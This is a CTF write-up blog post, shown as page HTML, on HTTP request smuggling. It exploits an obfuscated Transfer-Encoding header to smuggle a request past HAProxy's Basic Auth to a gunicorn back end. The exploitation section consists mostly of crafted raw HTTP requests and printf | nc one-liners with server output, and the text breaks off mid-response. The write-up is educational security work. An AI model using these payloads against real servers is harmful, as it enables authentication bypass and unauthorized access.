<!DOCTYPE html>
<html lang=en>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="During a CTF I recently came across a very cool challenge on Request Smuggling. I have been wanting to try my theoretical knowledge of this topic on a “real-life” scenario and this was the perfect occ">
<meta property="og:type" content="article">
<meta property="og:title" content="Misc CTF - Request Smuggling">
<meta property="og:url" content="https://hg8.sh/posts/misc-ctf/request-smuggling/index.html">
<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
<meta property="og:description" content="During a CTF I recently came across a very cool challenge on Request Smuggling. I have been wanting to try my theoretical knowledge of this topic on a “real-life” scenario and this was the perfect occ">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/88634010-18632f00-d0b6-11ea-8b54-dfe7c3364b1b.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/88634117-43e61980-d0b6-11ea-9f54-616e2caf7449.png">
<meta property="article:published_time" content="2020-07-27T22:00:00.000Z">
<meta property="article:modified_time" content="2020-07-30T08:30:27.379Z">
<meta property="article:author" content="hg8">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="request smuggling">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/88634010-18632f00-d0b6-11ea-8b54-dfe7c3364b1b.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
     
    <title>Misc CTF - Request Smuggling :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
<link rel="stylesheet" href="/css/style.css">

    
    
<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/posts/oouch/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/posts/book/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
    </span>
    <br/>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#About-Request-Smuggling"><span class="toc-number">1.</span> <span class="toc-text">About Request Smuggling</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">2.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">3.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HAProxy-request-handling"><span class="toc-number">3.1.</span> <span class="toc-text">HAProxy request handling.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Smuggling-request"><span class="toc-number">3.2.</span> <span class="toc-text">Smuggling request</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">4.</span> <span class="toc-text">References</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Prevention-Methods"><span class="toc-number">4.1.</span> <span class="toc-text">Prevention Methods</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Real-Life-Example"><span class="toc-number">4.2.</span> <span class="toc-text">Real Life Example</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        <header id="header">
  <a href="/">
  
      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
  
    <span class="logo__mark"></span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
       
        <li><a href="/">Home</a></li>
       
        <li><a href="/about/">About</a></li>
       
        <li><a href="/archives/">Posts</a></li>
       
        <li><a href="/search/">Search</a></li>
      
    </ul>
  </div>
</header>

        
          <br>
          <br>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Misc CTF - Request Smuggling
    </h1>



    <div class="meta"> 
      
    <div class="postdate">
      
        <time datetime="2020-07-27T22:00:00.000Z" itemprop="datePublished">28-07-2020</time>
        
      
    </div>


      — Written by 
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">hg8</span>
      </span>
      —
      9 min read
    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>During a CTF I recently came across a very cool challenge on Request Smuggling. I have been wanting to try my theoretical knowledge of this topic on a “real-life” scenario and this was the perfect occasion. It allowed me to get a deeper understand of what’s going on behind the hood when a request smuggling happens.</p>
<p>Since request smuggling is not a so “straightforward” vulnerability to understand at first, I will try to details as much as possible this post to help you get a clear picture of this cool vulnerability. </p>
<p><strong>Tl;Dr:</strong> In this challenge you have to exploit Request Smuggling in order to access a authentication protected endpoint and get the flag.</p>
<p>While not being in the OWASP Top 10, Request Smuggling is a very interesting vulnerability worth knowing about.</p>
<p>Alright! Let’s get into the details now!</p>
<hr>
<h2 id="About-Request-Smuggling"><a href="#About-Request-Smuggling" class="headerlink" title="About Request Smuggling"></a>About Request Smuggling</h2><p>Before we start let’s see a bit of history Request Smuggling. It was first presented in 2005 by Watchfire: <a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank" rel="noopener">HTTP Request Smuggling</a> and got recently repopularized by <a href="https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn" target="_blank" rel="noopener">PortSwigger’s research</a>.</p>
<p>It’s commonly defined this way:</p>
<ul>
<li>HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.</li>
</ul>
<p>The recent trend to complexifie infrastructure made this vulnerability more common and easier to exploit.</p>
<p>Let’s now see in practice how it can arise.</p>
<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Opening the challenge display the following page:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/88634010-18632f00-d0b6-11ea-8b54-dfe7c3364b1b.png" alt="request smuggling bs bingo"></p>
<p>We have a simple “Bingo” game, not much more going on there. The results page prompt us a <code>Basic Auth</code> so we can’t access it:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/88634117-43e61980-d0b6-11ea-9f54-616e2caf7449.png" alt="haproxy authentication"></p>
<p>Let’s gather as much informations as we can to better understand how the back-end of this app can be working.</p>
<p>First we notice the web server is running <code>gunicorn</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://misc.ctf:33433/ -I</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: gunicorn/19.9.0</span><br><span class="line">Date: Wed, 03 Jun 2020 13:15:33 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 3642</span><br></pre></td></tr></table></figure>

<p>As a reminder:</p>
<blockquote>
<p>Gunicorn ‘Green Unicorn’ is a Python WSGI HTTP Server for UNIX. It’s a pre-fork worker model. The Gunicorn server is broadly compatible with various web frameworks, simply implemented, light on server resources, and fairly speedy.<a href="https://gunicorn.org/" target="_blank" rel="noopener">https://gunicorn.org/</a></p>
</blockquote>
<p>Yet we also noticed, when trying to access <code>/results</code> endpoint, a “HAProxy Authentication”.</p>
<blockquote>
<p>HAProxy is free, open source software that provides a high availability load balancer and proxy server for TCP and HTTP-based applications that spreads requests across multiple servers.</p>
<p><a href="http://www.haproxy.org/" target="_blank" rel="noopener">http://www.haproxy.org/</a></p>
</blockquote>
<p>Alright, with those informations we can get a better understanding on how the back-end of the app looks like. We probably have something like this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">        User</span><br><span class="line">          | </span><br><span class="line">          |</span><br><span class="line">    +-----+-----+</span><br><span class="line">    |           |</span><br><span class="line">    |  HAProxy  |</span><br><span class="line">    |           |</span><br><span class="line">    +-----+-----+</span><br><span class="line">          | </span><br><span class="line">          |</span><br><span class="line">+---------+----------+     +-------------+</span><br><span class="line">|                    |     |             |</span><br><span class="line">|      Gunicorn      |     |   Web App   |</span><br><span class="line">|  WSGI HTTP Server  +-----+  Python (?) |</span><br><span class="line">|                    |     |             |</span><br><span class="line">+--------------------+     +-------------+</span><br></pre></td></tr></table></figure>

<p>At least more or less…</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Alright so now that we have a better understanding of the back-end we can start to see a way this could be exploited.</p>
<p>The endpoint <code>/results</code> we are trying to read is authentication protected by HAProxy, meaning the application itself probably don’t protect it. </p>
<p>So if we could find a way to make a direct request to the web server bypassing HAProxy we should be able to access <code>/results</code> without any authentication needed.</p>
<p>First thing that come to mind is exploiting vulnerability like Server-side request forgery. Unfortunately the app doesn’t allow to exploit such vulnerability… </p>
<p>Let’s continue to search.</p>
<p>Another possibility would be request smuggling. </p>
<p>The idea of Request Smuggling is to leverage the fact that HAProxy and Gunicorn might handle HTTP request differently to craft a request to <code>/results</code> that won’t be interpreted by the front-end server (HAProxy) which will sent it directly to the back-end. In the meantime the back-end server (Gunicorn) will interpret the request correctly, connect to <code>/results</code> endpoint and return the response normally.</p>
<p>Let’s see in practice how it work.</p>
<h3 id="HAProxy-request-handling"><a href="#HAProxy-request-handling" class="headerlink" title="HAProxy request handling."></a>HAProxy request handling.</h3><p>Making the following request to front-end HAProxy server:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: misc.ctf:33433</span><br><span class="line"><span class="attribute">Content-Length</span>: 6</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">X</span></span><br></pre></td></tr></table></figure>

<p>Will be forwarded to the back-end as such:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: misc.ctf:33433</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 172.21.0.1</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br></pre></td></tr></table></figure>

<p>We can see that the last <code>X</code> got dropped and <code>Content-length</code> got ignored. This is the intended behavior according to <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank" rel="noopener">RFC 7230 Message Body Length</a>:</p>
<blockquote>
<p>If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting (Section 9.4) and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.</p>
</blockquote>
<p>However when sending <code>\x0b</code> (vertical tab) before the “chunked” string HAProxy handle the request differently:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: misc.ctf:33433</span><br><span class="line"><span class="attribute">Content-Length</span>: 13</span><br><span class="line"><span class="attribute">Transfer-Encoding:[\x0b]chunked</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">SMUGGLED</span></span><br></pre></td></tr></table></figure>

<p>Gets forwarded to the back-end server as:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: misc.ctf:33433</span><br><span class="line"><span class="attribute">Content-Length</span>: 13</span><br><span class="line"><span class="attribute">Transfer-Encoding:</span></span><br><span class="line">                  chunked</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 172.21.0.1</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">SMUGGLED</span></span><br></pre></td></tr></table></figure>

<p>HAProxy processed the <code>Content-Length</code> header and determined that the request body is 6 bytes long, up to the end of <code>X</code>. This request is forwarded on to the back-end server.</p>
<p>However <code>gunicorn</code> will, according to the RFC, proceed <code>Transfer-Encoding</code> header and will handle the message body as using chunked encoding. </p>
<p>It will proceed the first chunk which is stated to be zero length, and so is treated as terminating the request. Yet the following bytes <code>SMUGGLED</code> are still here, being left unprocessed and the gunicorn back-end server will treat these as being the start of the next request in the sequence.</p>
<h3 id="Smuggling-request"><a href="#Smuggling-request" class="headerlink" title="Smuggling request"></a>Smuggling request</h3><p>Let’s see if we can confirm that it’s possible to make request smuggling on our Bullshit Bingo using the following request:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: misc.ctf:33433</span><br><span class="line"><span class="attribute">Content-Length</span>: 4</span><br><span class="line"><span class="attribute">Transfer-Encoding:�chunked</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">A</span></span><br><span class="line"><span class="attribute">B</span></span><br></pre></td></tr></table></figure>

<p>Because it uses the Content-Length when we have <code>[\x0b]</code> character in the <code>Transfer-Encoding</code> header, HAProxy will forward the following to the <code>gunicorn</code> backend:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: misc.ctf:33433</span><br><span class="line"><span class="attribute">Content-Length</span>: 4</span><br><span class="line"><span class="attribute">Transfer-Encoding:</span></span><br><span class="line">                  chunked</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 172.21.0.1</span><br><span class="line"></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">Z</span></span><br></pre></td></tr></table></figure>

<p>If the <code>gunicorn</code> parses this request using <code>Transfer-Encoding</code>, then it will timeout waiting for <code>0\r\n\r\n</code> chunk that would usually terminate the request. Let’s give a try:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ printf &quot;POST &#x2F; HTTP&#x2F;1.1\r\nHost: misc.ctf:33433\r\nContent-Length: 4\r\nTransfer-Encoding:^Lchunked\r\n\r\n1\r\nZ\r\nQ&quot; | nc misc.ctf:33433</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 400 BAD REQUEST</span><br><span class="line">Server: gunicorn&#x2F;19.9.0</span><br><span class="line">Date: Thu, 04 Jun 2020 17:21:42 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 192</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 3.2 Final&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line">&lt;title&gt;400 Bad Request&lt;&#x2F;title&gt;</span><br><span class="line">&lt;h1&gt;Bad Request&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;The browser (or proxy) sent a request that this server could not understand.&lt;&#x2F;p&gt;</span><br><span class="line">HTTP&#x2F;1.0 408 Request Time-out</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;408 Request Time-out&lt;&#x2F;h1&gt;</span><br><span class="line">Your browser didn&#39;t send a complete request in time.</span><br><span class="line">&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>Bingo, we got a <code>408 Request Time-out</code>. Also did you notice ? We got two response to, seemingly, one HTTP request. This confirm we can smuggle request.</p>
<p>But what now ? What can we do with that ?</p>
<p>First let’s try to see if it’s possible to smuggle a second HTTP request in the main one. </p>
<p>Let’s try for example to access a 404 page and see if the response match:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: misc.ctf:33433</span><br><span class="line"><span class="attribute">Content-Length</span>: 38</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Transfer-Encoding:�chunked</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">A</span></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /404 HTTP/1.1</span><br><span class="line"><span class="attribute">foo</span>: xGET / HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>Before trying, let’s details what <em>should</em> happen in this request?</p>
<p>Because of the <code>Content-Lengh</code> of 38, the HAProxy will transfer 2 different requests to the backend:</p>
<p><em>1st request:</em></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: misc.ctf:33433</span><br><span class="line"><span class="attribute">Content-Length</span>: 38</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Transfer-Encoding:�chunked</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">A</span></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /404 HTTP/1.1</span><br><span class="line"><span class="attribute">foo</span>: x</span><br></pre></td></tr></table></figure>

<p><em>2nd request:</em></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>Yet when <code>gunicorn</code> will receive the first request it will proceed the <code>Transfer-Encoding</code> header, processing the first part:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: misc.ctf:33433</span><br><span class="line"><span class="attribute">Content-Length</span>: 38</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Transfer-Encoding:�chunked</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">A</span></span><br><span class="line"><span class="attribute">0</span></span><br></pre></td></tr></table></figure>

<p>Until it arrives to the chunk which is stated to be zero length, and so treated as terminating the request. But! The following bytes are still there being left unprocessed:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/404</span> HTTP/1.1</span><br><span class="line"><span class="attribute">foo</span>: x</span><br></pre></td></tr></table></figure>

<p>So when <code>gunicorn</code> received the 2nd request:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>It will actually just get appended to the bytes which remained unprocessed before, resulting in the following request:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/404</span> HTTP/1.1</span><br><span class="line"><span class="attribute">foo</span>: xGET / HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>Which <code>gunicorn</code> will simply proceed as a valid request.</p>
<p>Alright, let’s see in practice if we can make it work!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">printf</span> <span class="string">"POST / HTTP/1.1\r\nHost: misc.ctf:33433\r\nContent-Length: 38\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding:^Lchunked\r\n\r\n1\r\nA\r\n0\r\n\r\nGET /404 HTTP/1.1\r\nfoo: xGET / HTTP/1.1\r\n\r\n"</span> | nc misc.ctf:33433</span><br><span class="line"></span><br><span class="line">HTTP/1.1 400 BAD REQUEST</span><br><span class="line">Server: gunicorn/19.9.0</span><br><span class="line">Date: Thu, 04 Jun 2020 17:38:16 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 192</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">"-//W3C//DTD HTML 3.2 Final//EN"</span>&gt;</span><br><span class="line">&lt;title&gt;400 Bad Request&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Bad Request&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The browser (or proxy) sent a request that this server could not understand.&lt;/p&gt;</span><br><span class="line">HTTP/1.1 404 NOT FOUND</span><br><span class="line">Server: gunicorn/19.9.0</span><br><span class="line">Date: Thu, 04 Jun 2020 17:38:16 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 232</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">"-//W3C//DTD HTML 3.2 Final//EN"</span>&gt;</span><br><span class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<p>Perfect! It worked.</p>
<p>What’s the next step ? Smuggling a request to <code>/results</code> endpoint. Since <code>HAProxy</code> won’t see the request it won’t prompt authentication. Yet <code>gunicorn</code> will proceed our request without issues.</p>
<p>We can do something like so:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: misc.ctf:33433</span><br><span class="line"><span class="attribute">Content-Length</span>: 39</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Transfer-Encoding:�chunked</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">A</span></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /results HTTP/1.1</span><br><span class="line"><span class="attribute">Foo</span>: xGET / HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>Let’s give it a try:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">printf</span> <span class="string">"POST / HTTP/1.1\r\nHost: misc.ctf:33433\r\nContent-Length: 39\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding:^Lchunked\r\n\r\n1\r\nA\r\n0\r\n\r\nGET /results HTTP/1.1\r\nFoo: xGET / HTTP/1.1\r\n\r\n"</span> | nc misc.ctf:33433</span><br><span class="line"></span><br><span class="line">HTTP/1.1 400 BAD REQUEST</span><br><span class="line">Server: gunicorn/19.9.0</span><br><span class="line">Date: Thu, 04 Jun 2020 17:41:32 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 192</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">"-//W3C//DTD HTML 3.2 Final//EN"</span>&gt;</span><br><span class="line">&lt;title&gt;400 Bad Request&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Bad Request&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The browser (or proxy) sent a request that this server could not 